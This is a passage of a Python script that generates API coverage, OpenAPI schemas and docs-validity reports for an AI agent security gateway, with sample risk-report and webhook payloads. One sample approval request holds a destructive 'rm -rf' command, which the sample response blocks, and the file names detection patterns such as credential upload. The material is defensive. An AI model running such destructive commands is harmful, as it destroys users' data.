        entry["response_example"] = {
            "session_id": "sess-001",
            "records": [],
            "next_cursor": None,
            "has_more": False,
        }
    elif method == "GET" and path == "/enterprise/report/session/{session_id}/page":
        entry["response_example"] = {
            "session_id": "sess-001",
            "records": [
                {
                    "event": {"event_id": "evt-001", "event_type": "pre_action", "tool_name": "bash"},
                    "trinityguard_classification": {
                        "mapped": True,
                        "tier": "RT1",
                        "subtype": "tool_misuse",
                        "label": "Tool Misuse",
                    },
                }
            ],
            "trinityguard_summary": {
                "mapped_records": 1,
                "unmapped_records": 0,
                "by_tier": {"RT1": 1},
                "by_subtype": {"tool_misuse": 1},
            },
            "next_cursor": None,
            "has_more": False,
        }
    elif method == "GET" and path == "/report/session/{session_id}/risk":
        entry["response_example"] = {
            "session_id": "sess-001",
            "agent_id": "agent-001",
            "source_framework": "a3s-code",
            "caller_adapter": "a3s-adapter.v1",
            "workspace_root": "/workspace/repo-alpha",
            "transcript_path": "/workspace/repo-alpha/.a3s/session-001.jsonl",
            "current_risk_level": "high",
            "cumulative_score": 5,
            "latest_composite_score": 2.4,
            "session_risk_sum": 6.7,
            "session_risk_ewma": 1.9,
            "latest_post_action_score": 1.0,
            "post_action_score_ewma": 0.72,
            "risk_points_sum": 5,
            "risk_velocity": "up",
            "window_risk_summary": {
                "window_seconds": 3600,
                "generated_at": "2026-03-23T10:31:00+00:00",
                "event_count": 12,
                "high_or_critical_count": 3,
                "latest_composite_score": 2.4,
                "session_risk_sum": 6.7,
                "session_risk_ewma": 1.9,
                "risk_points_sum": 5,
                "risk_velocity": "up",
                "score_range": [0.0, 3.0],
                "score_semantics": {
                    "zero_with_no_events": "no_data_not_confirmed_low_risk",
                    "decision_affecting": False,
                },
                "decision_affecting": False,
            },
            "post_action_score_summary": {
                "window_seconds": 3600,
                "generated_at": "2026-03-23T10:31:00+00:00",
                "event_count": 3,
                "latest_post_action_score": 1.0,
                "post_action_score_sum": 2.4,
                "post_action_score_avg": 0.8,
                "post_action_score_ewma": 0.72,
                "score_range": [0.0, 3.0],
                "score_semantics": {
                    "zero_with_no_events": "no_post_action_data_not_confirmed_low_risk",
                    "decision_affecting": False,
                },
                "decision_affecting": False,
            },
            "score_range": [0.0, 3.0],
            "score_semantics": {
                "zero_with_no_events": "no_data_not_confirmed_low_risk",
                "decision_affecting": False,
            },
            "event_count": 25,
            "high_or_critical_count": 3,
            "risk_timeline": [
                {
                    "event_id": "evt-001",
                    "occurred_at": "2026-03-23T10:00:00+00:00",
                    "risk_level": "low",
                    "composite_score": 1.0,
                    "tool_name": "bash",
                    "decision": "allow",
                },
                {
                    "event_id": "evt-002",
                    "occurred_at": "2026-03-23T10:05:00+00:00",
                    "risk_level": "high",
                    "composite_score": 2.4,
                    "tool_name": "bash",
                    "decision": "block",
                },
            ],
            "risk_hints_seen": ["destructive_pattern", "shell_execution"],
            "tools_used": ["bash", "file_editor"],
            "actual_tier_distribution": {"L1": 23, "L2": 2},
            "l3_advisory": {
                "latest_review": {"review_id": "l3adv-001", "snapshot_id": "l3snap-001", "l3_state": "completed", "advisory_only": True},
                "latest_job": {"job_id": "l3job-001", "job_state": "completed", "runner": "llm_provider"},
            },
            "decision_path_io": {
                "record_path": {"calls": 25},
                "reporting": {"report_session_risk": {"calls": 1}},
            },
            "generated_at": "2026-03-23T10:31:00+00:00",
            "window_seconds": 3600,
        }
    elif method == "GET" and path == "/enterprise/report/session/{session_id}/risk":
        entry["response_example"] = {
            "session_id": "sess-001",
            "current_risk_level": "high",
            "session_risk_ewma": 1.9,
            "actual_tier_distribution": {"L1": 23, "L2": 2, "L3": 1},
            "risk_timeline": [
                {
                    "event_id": "evt-001",
                    "risk_level": "high",
                    "decision": "block",
                    "trinityguard_classification": {
                        "mapped": True,
                        "tier": "RT1",
                        "tier_label": "Atomic Risks",
                        "subtype": "sensitive_info_disclosure",
                        "label": "Sensitive Info Disclosure",
                    },
                }
            ],
            "trinityguard_summary": {
                "mapped_records": 1,
                "unmapped_records": 0,
                "by_tier": {"RT1": 1},
                "by_subtype": {"sensitive_info_disclosure": 1},
            },
            "generated_at": "2026-04-25T12:00:05Z",
            "window_seconds": 3600,
        }
    elif method == "GET" and path == "/report/session/{session_id}/post-action":
        entry["response_example"] = {
            "session_id": "sess-001",
            "latest_post_action_score": 1.0,
            "post_action_score_sum": 2.4,
            "post_action_score_avg": 0.8,
            "post_action_score_ewma": 0.72,
            "post_action_event_count": 3,
            "score_range": [0.0, 3.0],
            "score_semantics": {
                "zero_with_no_events": "no_post_action_data_not_confirmed_low_risk",
                "decision_affecting": False,
                "aggregation": "latest, sum, avg, and EWMA are separate from session_risk_ewma; do not add raw channels",
            },
            "post_action_score_summary": {
                "window_seconds": 3600,
                "generated_at": "2026-03-23T10:31:00+00:00",
                "event_count": 3,
                "latest_post_action_score": 1.0,
                "post_action_score_sum": 2.4,
                "post_action_score_avg": 0.8,
                "post_action_score_ewma": 0.72,
                "score_range": [0.0, 3.0],
                "score_semantics": {
                    "zero_with_no_events": "no_post_action_data_not_confirmed_low_risk",
                    "decision_affecting": False,
                },
                "decision_affecting": False,
            },
            "decision_affecting": False,
            "post_action_scores": [
                {
                    "event_id": "evt-post-001",
                    "occurred_at": "2026-03-23T10:05:00+00:00",
                    "tool_name": "read_file",
                    "source_framework": "a3s-code",
                    "tier": "escalate",
                    "patterns_matched": ["indirect_injection"],
                    "score": 1.0,
                    "handling": "broadcast",
                }
            ],
            "decision_path_io": {
                "record_path": {"calls": 25},
                "reporting": {"report_session_post_action": {"calls": 1}},
            },
            "generated_at": "2026-03-23T10:31:00+00:00",
            "window_seconds": 3600,
        }
    elif path.startswith("/report/l3-advisory/") or "/l3-advisory/" in path:
        if method != "GET":
            entry["request_example"] = {"session_id": "sess-001", "runner": "llm_provider", "queue_only": False}
        entry["response_example"] = {
            "advisory_only": True,
            "canonical_decision_mutated": False,
            "snapshot_id": "l3snap-001",
            "job_id": "l3job-001",
            "review_id": "l3adv-001",
            "l3_state": "completed",
        }
    elif method == "GET" and path == "/enterprise/report/alerts":
        entry["response_example"] = {
            "alerts": [
                {
                    "alert_id": "alert-001",
                    "severity": "high",
                    "status": "open",
                    "session_id": "sess-001",
                    "trinityguard_classification": {
                        "mapped": True,
                        "tier": "RT1",
                        "subtype": "tool_misuse",
                        "label": "Tool Misuse",
                    },
                }
            ],
            "enterprise": {
                "live_risk_overview": {
                    "by_trinityguard_tier": {"RT1": 1},
                    "by_trinityguard_subtype": {"tool_misuse": 1},
                }
            },
        }
    elif method == "GET" and path == "/report/alerts":
        entry["response_example"] = {
            "alerts": [{"alert_id": "alert-001", "severity": "high", "status": "open", "session_id": "sess-001"}]
        }
    elif method == "POST" and path == "/report/alerts/{alert_id}/acknowledge":
        entry["request_example"] = {"operator": "secops@example.com", "note": "Reviewed and assigned."}
        entry["response_example"] = {"alert_id": "alert-001", "status": "acknowledged"}
    elif path.endswith("/enforcement"):
        if method == "POST":
            entry["request_example"] = {"action": "release", "reason": "Operator cleared the session hold."}
        entry["response_example"] = {"session_id": "sess-001", "enforced": False, "reason": None}
    elif path == "/ahp/patterns":
        entry["response_example"] = {"patterns": [{"id": "credential-upload", "status": "active"}]}
    elif path == "/ahp/patterns/confirm":
        entry["request_example"] = {"pattern_id": "candidate-001", "decision": "confirm"}
        entry["response_example"] = {"pattern_id": "candidate-001", "status": "confirmed"}


def coverage_entries() -> list[dict[str, Any]]:
    entries: list[dict[str, Any]] = []
    source_locations = extract_source_route_locations()
    for route in ROUTES:
        entry = dict(route)
        entry["source"] = _current_source_for(entry, source_locations)
        if entry["service"] == "openclaw-webhook" and entry["method"] == "POST" and entry["path"] == "/webhook/openclaw":
            entry["request_example"] = {
                "type": "exec.approval.requested",
                "idempotencyKey": "openclaw-demo-001",
                "sessionKey": "sess-001",
                "agentId": "agent-001",
                "payload": {"command": "rm -rf /tmp/demo", "approval_id": "apr-001"},
            }
            entry["response_example"] = {
                "decision": "block",
                "reason": "destructive command pattern detected",
                "risk_level": "high",
                "failure_class": "none",
                "final": True,
            }
            entry["errors"] = ["400", "401", "403", "409", "413", "415", "422", "500"]
        excluded = entry.get("public_status") == "excluded"
        entry.setdefault("request_example", {"query": {}, "path": {}} if route["method"] == "GET" else DEFAULT_REQUEST)
        entry.setdefault("response_example", DEFAULT_RESPONSE)
        entry.setdefault("errors", ["500"] if route["method"] == "GET" and route["auth"] == "none" else DEFAULT_ERRORS)
        _apply_curated_examples(entry)
        entry.setdefault("exclusion_reason", None)
        entry["openapi_ref"] = None if excluded else _openapi_ref(route["path"], route["method"])
        entries.append(entry)
    return entries


def extract_source_route_locations() -> dict[tuple[str, str, str], str]:
    """Return current route decorator/registration locations keyed by service/method/path."""

    patterns = {
        "gateway": re.compile(r"@app\.(get|post|patch)\(\"([^\"]+)\""),
        "gateway-enterprise": re.compile(r"@_enterprise_get\(\"([^\"]+)\""),
        "stack": re.compile(r"@app\.(post)\(\"([^\"]+)\""),
        "openclaw-webhook": re.compile(r"@app\.(get|post)\(\"([^\"]+)\""),
    }
    found: dict[tuple[str, str, str], str] = {}
    for service, path in SOURCE_FILES.items():
        lines = path.read_text(encoding="utf-8").splitlines()
        rel_path = path.relative_to(REPO_ROOT).as_posix()
        for lineno, line in enumerate(lines, start=1):
            if service == "gateway":
                for method, route in patterns["gateway"].findall(line):
                    route_service = "gateway"
                    if route.startswith("/enterprise/"):
                        route_service = "gateway-enterprise"
                    elif route.startswith("/ui"):
                        route_service = "gateway-ui"
                    found[(route_service, method.upper(), route)] = f"{rel_path}:{lineno}"
                for route in patterns["gateway-enterprise"].findall(line):
                    found[("gateway-enterprise", "GET", route)] = f"{rel_path}:{lineno}"
            elif service == "stack":
                for method, route in patterns["stack"].findall(line):
                    found[("stack", method.upper(), route)] = f"{rel_path}:{lineno}"
            else:
                for method, route in patterns["openclaw-webhook"].findall(line):
                    found[("openclaw-webhook", method.upper(), route)] = f"{rel_path}:{lineno}"
    return found


def extract_source_routes() -> set[tuple[str, str, str]]:
    return set(extract_source_route_locations())


def _entry_key(entry: dict[str, Any]) -> tuple[str, str, str]:
    return (entry["service"], entry["method"], entry["path"])


def _current_source_for(entry: dict[str, Any], source_locations: dict[tuple[str, str, str], str] | None = None) -> str:
    source_locations = source_locations or extract_source_route_locations()
    return source_locations.get(_entry_key(entry), entry["source"])


def _source_line_matches_entry(entry: dict[str, Any]) -> bool:
    source = entry.get("source", "")
    if ":" not in source:
        return False
    file_name, line_text = source.rsplit(":", 1)
    try:
        lineno = int(line_text)
    except ValueError:
        return False
    path = REPO_ROOT / file_name
    if not path.exists():
        return False
    lines = path.read_text(encoding="utf-8").splitlines()
    if lineno < 1 or lineno > len(lines):
        return False
    line = lines[lineno - 1]
    route = re.escape(entry["path"])
    method = entry["method"].lower()
    if entry["service"] == "gateway-enterprise":
        return bool(re.search(rf"@_enterprise_get\(\"{route}\"", line))
    return bool(re.search(rf"@app\.{method}\(\"{route}\"", line))


def write_coverage() -> None:
    COVERAGE_PATH.write_text(json.dumps(coverage_entries(), ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


SESSION_RISK_EWMA_SCHEMA: dict[str, Any] = {
    "type": "number",
    "minimum": 0.0,
    "maximum": 3.0,
    "description": (
        "Windowed session risk EWMA display score, alpha=0.3 "
        "(ewma_0 = score_0; ewma_n = 0.3 * score_n + 0.7 * ewma_(n-1)). "
        "Range is 0.0..3.0. A 0.0 value when no window events exist uses the "
        "no_data_not_confirmed_low_risk sentinel and must not be read as confirmed low risk. "
        "This is an observability/UI field and is non-decision-affecting."
    ),
}


SCORE_RANGE_SCHEMA: dict[str, Any] = {
    "type": "array",
    "items": {"type": "number"},
    "minItems": 2,
    "maxItems": 2,
    "description": "Inclusive score range for session risk display values: [0.0, 3.0].",
}


SCORE_SEMANTICS_SCHEMA: dict[str, Any] = {
    "type": "object",
    "properties": {
        "zero_with_no_events": {
            "type": "string",
            "enum": ["no_data_not_confirmed_low_risk"],
            "description": "0.0 with no events is a no-data sentinel, not confirmed low risk.",
        },
        "decision_affecting": {
            "type": "boolean",
            "const": False,
            "description": "Session risk display metrics do not alter canonical Gateway decisions.",
        },
    },
    "additionalProperties": True,
}


WINDOW_RISK_SUMMARY_SCHEMA: dict[str, Any] = {
    "type": "object",
    "properties": {
        "window_seconds": {"type": ["integer", "null"], "minimum": 1},
        "generated_at": {"type": "string"},
        "event_count": {"type": "integer", "minimum": 0},
        "high_or_critical_count": {
            "type": "integer",
            "minimum": 0,
            "description": "Canonical high/critical event count. Do not expose legacy high_risk_event_count here.",
        },
        "latest_composite_score": {"type": "number", "minimum": 0.0, "maximum": 3.0},
        "session_risk_sum": {"type": "number", "minimum": 0.0},
        "session_risk_ewma": SESSION_RISK_EWMA_SCHEMA,
        "risk_points_sum": {"type": "integer", "minimum": 0},
        "risk_velocity": {"type": "string"},
        "score_range": SCORE_RANGE_SCHEMA,
        "score_semantics": SCORE_SEMANTICS_SCHEMA,
        "decision_affecting": {"type": "boolean", "const": False},
    },
    "additionalProperties": True,
}


SESSION_SUMMARY_SCHEMA: dict[str, Any] = {
    "type": "object",
    "properties": {
        "session_id": {"type": "string"},
        "agent_id": {"type": "string"},
        "source_framework": {"type": "string"},
        "caller_adapter": {"type": "string"},
        "workspace_root": {"type": "string"},
        "transcript_path": {"type": "string"},
        "current_risk_level": {"type": "string", "enum": ["low", "medium", "high", "critical"]},
        "cumulative_score": {"type": "number"},
        "latest_composite_score": {"type": "number", "minimum": 0.0, "maximum": 3.0},
        "session_risk_sum": {"type": "number", "minimum": 0.0},
        "session_risk_ewma": SESSION_RISK_EWMA_SCHEMA,
        "risk_points_sum": {"type": "integer", "minimum": 0},
        "risk_velocity": {"type": "string"},
        "window_risk_summary": WINDOW_RISK_SUMMARY_SCHEMA,
        "score_range": SCORE_RANGE_SCHEMA,
        "score_semantics": SCORE_SEMANTICS_SCHEMA,
        "event_count": {"type": "integer", "minimum": 0},
        "high_or_critical_count": {"type": "integer", "minimum": 0},
        "decision_distribution": {"type": "object", "additionalProperties": {"type": "integer", "minimum": 0}},
    },
    "additionalProperties": True,
}


def _response_schema_for(entry: dict[str, Any]) -> dict[str, Any] | None:
    path = entry["path"]
    if path in {"/report/sessions", "/enterprise/report/sessions"}:
        return {
            "type": "object",
            "properties": {
                "sessions": {"type": "array", "items": SESSION_SUMMARY_SCHEMA},
                "total_active": {"type": "integer", "minimum": 0},
                "generated_at": {"type": "string"},
                "window_seconds": {"type": ["integer", "null"], "minimum": 1},
            },
            "additionalProperties": True,
        }
    if path in {"/report/session/{session_id}/risk", "/enterprise/report/session/{session_id}/risk"}:
        return SESSION_SUMMARY_SCHEMA
    return None


def operation_for(entry: dict[str, Any]) -> dict[str, Any]:
    params = []
    for name in re.findall(r"\{([^}:]+)(?::[^}]+)?\}", entry["path"]):
        params.append({"name": name, "in": "path", "required": True, "schema": {"type": "string"}})
    if entry["path"] in {"/report/sessions", "/enterprise/report/sessions"}:
        limit_maximum = 5000 if entry["path"].startswith("/enterprise/") else 200
        params.extend([
            {"name": "status", "in": "query", "required": False, "schema": {"type": "string", "enum": ["active", "all"], "default": "active"}},
            {"name": "sort", "in": "query", "required": False, "schema": {"type": "string", "enum": ["risk_level", "last_event"], "default": "risk_level"}},
            {"name": "limit", "in": "query", "required": False, "schema": {"type": "integer", "minimum": 1, "maximum": limit_maximum, "default": 50}},
            {"name": "min_risk", "in": "query", "required": False, "schema": {"type": "string", "enum": ["low", "medium", "high", "critical"]}},
        ])
    if entry["path"] in {"/report/session/{session_id}", "/report/session/{session_id}/risk", "/report/session/{session_id}/post-action", "/enterprise/report/session/{session_id}", "/enterprise/report/session/{session_id}/risk"}:
        params.append({"name": "limit", "in": "query", "required": False, "schema": {"type": "integer", "minimum": 1, "maximum": 1000, "default": 100}})
    if entry["path"] in {"/report/session/{session_id}/page", "/enterprise/report/session/{session_id}/page"}:
        params.extend([
            {"name": "limit", "in": "query", "required": False, "schema": {"type": "integer", "minimum": 1, "maximum": 1000, "default": 100}},
            {"name": "cursor", "in": "query", "required": False, "schema": {"type": "integer", "minimum": 0}},
        ])
    if entry["path"] in {"/report/summary", "/report/policy-drift", "/report/sessions", "/report/session/{session_id}", "/report/session/{session_id}/page", "/report/session/{session_id}/risk", "/report/session/{session_id}/post-action", "/report/alerts", "/enterprise/report/summary", "/enterprise/report/policy-drift", "/enterprise/report/sessions", "/enterprise/report/session/{session_id}", "/enterprise/report/session/{session_id}/page", "/enterprise/report/session/{session_id}/risk", "/enterprise/report/alerts"}:
        params.append({"name": "window_seconds", "in": "query", "required": False, "schema": {"type": "integer", "minimum": 1, "maximum": 604800}})
    if entry["path"] in {"/report/policy-drift", "/enterprise/report/policy-drift"}:
        params.append({"name": "max_cells", "in": "query", "required": False, "schema": {"type": "integer", "minimum": 1, "maximum": 5000}})
    if entry["path"] == "/enterprise/report/live":
        params.append({"name": "cached", "in": "query", "required": False, "schema": {"type": "boolean", "default": False}})
    if entry["path"] in {"/report/stream", "/enterprise/report/stream"}:
        params.extend([
            {"name":"session_id","in":"query","required":False,"schema":{"type":"string"}},
            {"name":"min_risk","in":"query","required":False,"schema":{"type":"string","enum":["low","medium","high","critical"]}},
            {"name":"types","in":"query","required":False,"schema":{"type":"string"}},
            {"name":"token","in":"query","required":False,"schema":{"type":"string"}},
        ])
    if entry["service"] == "openclaw-webhook" and entry["path"] == "/webhook/openclaw":
        params.extend([
            {"name": "Authorization", "in": "header", "required": True, "schema": {"type": "string"}, "description": "Bearer <OPENCLAW_WEBHOOK_TOKEN>"},
            {"name": "X-AHP-Signature", "in": "header", "required": False, "schema": {"type": "string"}, "description": "v1=<hmac-sha256>, required in strict mode when OPENCLAW_WEBHOOK_SECRET is configured"},
            {"name": "X-AHP-Timestamp", "in": "header", "required": False, "schema": {"type": "string"}, "description": "Unix timestamp used for signed webhook replay protection"},
            {"name": "Content-Type", "in": "header", "required": True, "schema": {"type": "string", "enum": ["application/json"]}},
        ])
    success_content_type = "application/json"
    if entry["path"] == "/metrics":
        success_content_type = "text/plain"
    elif entry["path"] in {"/report/stream", "/enterprise/report/stream"}:
        success_content_type = "text/event-stream"

    if success_content_type == "application/json":
        json_content: dict[str, Any] = {"example": entry["response_example"]}
        response_schema = _response_schema_for(entry)
        if response_schema is not None:
            json_content["schema"] = response_schema
        success_response: dict[str, Any] = {
            "description": "Successful response",
            "content": {"application/json": json_content},
        }
    else:
        # Scalar 1.52.5 attempts to parse plain-text and event-stream response
        # bodies as JSON/YAML and logs "Invalid YAML object" for valid string
        # samples. Keep those examples in api-coverage.json/api-validity.json and
        # omit the non-JSON response body from the interactive artifact.
        success_response = {
            "description": (
                f"Successful {success_content_type} response. "
                "See api-coverage.json for the curated text example."
            ),
            "x-clawsentry-text-example": entry["response_example"],
        }

    op: dict[str, Any] = {
        "tags": [entry["group"]],
        "summary": entry["summary"],
        "description": f"Service: `{entry['service']}`. Auth: `{entry['auth']}`. {entry['auth_note']} See `{entry['markdown_ref']}`.",
        "parameters": params,
        "responses": {"200": success_response},
        "x-clawsentry-source": entry["source"],
        "x-clawsentry-markdown-ref": entry["markdown_ref"],
        "x-clawsentry-auth-note": entry["auth_note"],
    }
    if entry["method"] != "GET":
        op["requestBody"] = {"required": entry["service"] == "openclaw-webhook" or entry["method"] in {"POST", "PATCH", "PUT"}, "content": {"application/json": {"example": entry["request_example"]}}}
    for code in entry.get("errors") or []:
        op["responses"].setdefault(code, {"description": f"Error {code}"})
    if "bearer" in entry["auth"] or entry["auth"] == "query-token":
        op["security"] = [{"BearerAuth": []}]
    if entry["service"] == "openclaw-webhook" and entry["path"] == "/webhook/openclaw":
        op["security"] = [{"BearerAuth": []}]
    return op


def write_openapi() -> None:
    paths: dict[str, Any] = {}
    for entry in coverage_entries():
        if entry["public_status"] == "excluded":
            continue
        paths.setdefault(entry["path"], {})[entry["method"].lower()] = operation_for(entry)
    spec = {
        "openapi": "3.1.0",
        "info": {
            "title": "ClawSentry Public API Reference",
            "version": package_version(),
            "description": "Docs-owned OpenAPI artifact generated from route inventory plus curated semantic metadata. It does not change runtime API behavior.",
        },
        "servers": [
            {"url": "http://127.0.0.1:8080", "description": "ClawSentry Gateway"},
            {"url": "http://127.0.0.1:8081", "description": "OpenClaw Webhook Receiver (example)"},
        ],
        "components": {
            "securitySchemes": {"BearerAuth": {"type": "http", "scheme": "bearer"}, "WebhookSignature": {"type": "apiKey", "in": "header", "name": "X-AHP-Signature"}, "WebhookTimestamp": {"type": "apiKey", "in": "header", "name": "X-AHP-Timestamp"}},
            "schemas": {
                "CanonicalDecision": {"type":"object","required":["decision","reason","risk_level"],"properties":{"decision":{"type":"string","enum":["allow","block","defer","modify"]},"reason":{"type":"string"},"risk_level":{"type":"string","enum":["low","medium","high","critical"]},"final":{"type":"boolean"}}},
                "CanonicalEvent": {"type":"object","required":["schema_version","event_id","event_type","session_id","source_framework","payload"],"properties":{"schema_version":{"type":"string"},"event_id":{"type":"string"},"event_type":{"type":"string"},"session_id":{"type":"string"},"source_framework":{"type":"string"},"payload":{"type":"object"}}},
                "ErrorResponse": {"type":"object","properties":{"error":{"type":"string"},"failure_class":{"type":"string"}}},
            },
        },
        "paths": paths,
        "x-clawsentry-docs": {"coverage": "api-coverage.json", "source": "scripts/docs_api_inventory.py"},
    }
    OPENAPI_PATH.write_text(json.dumps(spec, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")



DOCS_ENDPOINT_RE = re.compile(r"\b(GET|POST|PATCH|PUT|DELETE)\s+`?(/[-A-Za-z0-9_./{}:*]+)(?:\?[-A-Za-z0-9_=&{}:*./]+)?`?")


def _resolve_repo_path(value: str | Path) -> Path:
    path = Path(value)
    return path if path.is_absolute() else REPO_ROOT / path


def _docs_scan_files() -> list[Path]:
    generated = {VALIDITY_MD_PATH}
    files = [path for path in sorted(API_DOCS_DIR.glob("*.md")) if path not in generated]
    files.extend([
        REPO_ROOT / "site-docs" / "index.md",
        REPO_ROOT / "site-docs" / "getting-started" / "quickstart.md",
    ])
    return [path for path in files if path.exists()]


def _path_template_regex(template: str) -> re.Pattern[str]:
    escaped = re.escape(template)
    escaped = re.sub(r"\\\{[^/}]+\\\}", r"[^/]+", escaped)
    return re.compile(rf"^{escaped}$")


def _markdown_anchor_present(markdown_ref: str) -> bool:
    page, _, anchor = markdown_ref.partition("#")
    page_path = REPO_ROOT / "site-docs" / page
    if not page_path.exists():
        return False
    if not anchor or page_path.suffix != ".md":
        return True
    return f"{{#{anchor}}}" in page_path.read_text(encoding="utf-8")


def _openapi_operation_present(entry: dict[str, Any], openapi: dict[str, Any]) -> bool:
    if entry.get("public_status") == "excluded":
        return entry.get("openapi_ref") is None
    return entry["method"].lower() in openapi.get("paths", {}).get(entry["path"], {})


def _match_doc_endpoint(
    method: str,
    raw_path: str,
    page: Path,
    by_method_path: dict[tuple[str, str], list[dict[str, Any]]],
    coverage: list[dict[str, Any]],
) -> tuple[list[dict[str, Any]], str]:
    path = raw_path.rstrip(".,);]")
    if path != "/" and path.endswith("/"):
        path = path[:-1]
    if path == "/report/*":
        matches = [entry for entry in coverage if entry["method"] == method and entry["path"].startswith("/report/")]
        return matches, "group-alias:/report/*"
    endpoint_aliases = {
        ("POST", "/report/alerts/{id}/ack"): "/report/alerts/{alert_id}/acknowledge",
    }
    alias_path = endpoint_aliases.get((method, path))
    if alias_path:
        return by_method_path.get((method, alias_path), []), "endpoint-alias"
    exact = by_method_path.get((method, path), [])
    if len(exact) == 1:
        return exact, "exact"
    if len(exact) > 1:
        if method == "GET" and path == "/health":
            if page.as_posix().endswith("api/webhooks.md"):
                webhook = [entry for entry in exact if entry["service"] == "openclaw-webhook"]
                return webhook, "duplicate-health:openclaw-webhook"
            gateway = [entry for entry in exact if entry["service"] == "gateway"]
            return gateway, "duplicate-health:gateway-default"
        return exact, "exact-ambiguous-service"
    alias_matches = [
        entry
        for entry in coverage
        if entry["method"] == method and _path_template_regex(entry["path"]).match(path)
    ]
    if len(alias_matches) == 1:
        return alias_matches, "parameter-alias"
    if path in {"/ui", "/ui/{path:path}"}:
        ui = [entry for entry in coverage if entry["method"] == method and entry["path"] == path]
        return ui, "excluded-ui"
    return [], "unmatched"


def analyze_docs_endpoint_mentions(coverage: list[dict[str, Any]]) -> dict[str, Any]:
    by_method_path: dict[tuple[str, str], list[dict[str, Any]]] = defaultdict(list)
    for entry in coverage:
        by_method_path[(entry["method"], entry["path"])].append(entry)
    mentions_by_key: dict[tuple[str, str, str], list[dict[str, Any]]] = defaultdict(list)
    unmatched: list[dict[str, Any]] = []
    matched: list[dict[str, Any]] = []
    for page in _docs_scan_files():
        text = page.read_text(encoding="utf-8")
        rel_page = page.relative_to(REPO_ROOT / "site-docs").as_posix()
        for match in DOCS_ENDPOINT_RE.finditer(text):
            method, raw_path = match.groups()
            entries, rule = _match_doc_endpoint(method, raw_path, page, by_method_path, coverage)
            line = text.count("\n", 0, match.start()) + 1
            mention = {"page": rel_page, "line": line, "method": method, "path": raw_path, "rule": rule}
            if not entries:
                unmatched.append(mention)
                continue
            for entry in entries:
                key = _entry_key(entry)
                mention_for_entry = dict(mention)
                mention_for_entry["coverage_key"] = " ".join(key)
                mentions_by_key[key].append(mention_for_entry)
                matched.append(mention_for_entry)
    return {
        "matched": matched,
        "unmatched": unmatched,
        "mentions_by_key": {" ".join(key): value for key, value in sorted(mentions_by_key.items())},
        "matched_count": len(matched),
        "unmatched_count": len(unmatched),
    }


def _example_status(entry: dict[str, Any]) -> str:
    request_ok = entry["method"] == "GET" or bool(entry.get("request_example"))
    response_ok = bool(entry.get("response_example"))
    errors_ok = bool(entry.get("errors"))
    if request_ok and response_ok and errors_ok:
        return "request/response/errors-present"
    missing = []
    if not request_ok:
        missing.append("request_example")
    if not response_ok:
        missing.append("response_example")
    if not errors_ok:
        missing.append("errors")
    return "missing:" + ",".join(missing)


def _runtime_check(entry: dict[str, Any]) -> tuple[str, str, str]:
    if entry["public_status"] == "excluded":
        return "not-applicable", "excluded-from-reference", entry.get("exclusion_reason") or "Excluded from shared API Reference."
    if entry["public_status"] == "enterprise":
        return "enterprise-conditional", "contract-verified", "Route is conditionally registered when enterprise mode is enabled; no default live 2xx claim is made."
    if entry["method"] == "GET" and entry["path"] == "/health" and entry["service"] == "gateway":
        return "safe-live-smoke-eligible", "contract-verified", "Safe for local live smoke; report generation does not start services or claim a 2xx run."
    if entry["method"] == "GET" and entry["path"] == "/metrics":
        return "safe-live-smoke-eligible-with-env", "contract-verified", "Can be smoked with CS_METRICS_AUTH=false; report generation keeps it contract-only unless an operator starts the service."
    if entry["method"] == "GET" and entry["path"].startswith("/report/"):
        return "read-only-contract", "contract-verified", "Read-only endpoint is verified by source/OpenAPI/docs trace; deterministic live empty-state is deployment-dependent."
    return "contract-only", "contract-verified", "Write/stateful/auth-dependent endpoint is not blindly invoked by the docs report."


def build_validity_report() -> dict[str, Any]:
    coverage = json.loads(COVERAGE_PATH.read_text(encoding="utf-8"))
    openapi = json.loads(OPENAPI_PATH.read_text(encoding="utf-8"))
    docs_mentions = analyze_docs_endpoint_mentions(coverage)
    mention_map = docs_mentions["mentions_by_key"]
    source_locations = extract_source_route_locations()
    endpoints = []
    for entry in coverage:
        key = _entry_key(entry)
        source_route_present = key in source_locations
        runtime_kind, runtime_result, runtime_note = _runtime_check(entry)
        endpoint = {
            "coverage_key": " ".join(key),
            "service": entry["service"],
            "method": entry["method"],
            "path": entry["path"],
            "public_status": entry["public_status"],
            "group": entry["group"],
            "audience": entry["audience"],
            "auth": entry["auth"],
            "auth_note": entry["auth_note"],
            "source": entry["source"],
            "source_line_current": entry["source"],
            "source_route_present": source_route_present,
            "source_line_valid": _source_line_matches_entry(entry),
            "markdown_ref": entry["markdown_ref"],
            "markdown_anchor_present": _markdown_anchor_present(entry["markdown_ref"]),
            "openapi_ref": entry.get("openapi_ref"),
            "openapi_operation_present": _openapi_operation_present(entry, openapi),
            "docs_endpoint_mentions": mention_map.get(" ".join(key), []),
            "docs_mention_rule": sorted({m["rule"] for m in mention_map.get(" ".join(key), [])}),
            "example_status": _example_status(entry),
            "runtime_check_kind": runtime_kind,
            "runtime_check_result": runtime_result,
            "notes": runtime_note,
        }
        endpoints.append(endpoint)
    status_counts = Counter(entry["public_status"] for entry in coverage)
    group_counts = Counter(entry["group"] for entry in coverage)
    errors = validate()
    for mention in docs_mentions["unmatched"]:
        errors.append(f"docs endpoint mention unmatched: {mention['page']}:{mention['line']} {mention['method']} {mention['path']}")
    for endpoint in endpoints:
        if not endpoint["source_line_valid"]:
            errors.append(f"stale source line: {endpoint['coverage_key']} -> {endpoint['source']}")
        if not endpoint["markdown_anchor_present"]:
            errors.append(f"missing markdown anchor: {endpoint['coverage_key']} -> {endpoint['markdown_ref']}")
        if not endpoint["openapi_operation_present"]:
            errors.append(f"missing openapi operation: {endpoint['coverage_key']} -> {endpoint['openapi_ref']}")
    return {
        "schema_version": REPORT_SCHEMA_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "source_artifacts": {
            "coverage": COVERAGE_PATH.relative_to(REPO_ROOT).as_posix(),
            "openapi": OPENAPI_PATH.relative_to(REPO_ROOT).as_posix(),
            "inventory_script": "scripts/docs_api_inventory.py",
        },
        "summary": {
            "total_coverage_entries": len(coverage),
            "openapi_operations": sum(len(methods) for methods in openapi.get("paths", {}).values()),
            "status_counts": dict(sorted(status_counts.items())),
            "group_counts": dict(sorted(group_counts.items())),
            "docs_endpoint_mentions_matched": docs_mentions["matched_count"],
            "docs_endpoint_mentions_unmatched": docs_mentions["unmatched_count"],
            "valid": not errors,
        },
        "docs_reverse_validation": {
            "rules": [
                "Exact METHOD /path mentions map directly to coverage.",
